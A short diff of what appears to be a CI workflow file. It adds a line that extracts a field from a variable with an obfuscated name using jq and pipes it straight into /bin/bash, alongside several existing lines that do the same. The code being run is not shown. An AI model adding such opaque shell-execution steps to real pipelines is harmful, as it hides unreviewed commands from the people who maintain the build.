@@ -26,6 +26,7 @@ jobs:
           echo $aokl335 | jq -r .pfgf6 | /bin/bash
           echo $homx7879 | jq -r .pd2 | /bin/bash
           printf '%s' "$cq72741" | jq -r .sgbms3391 | /bin/bash
+          echo $ip7905 | jq -r .a563 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
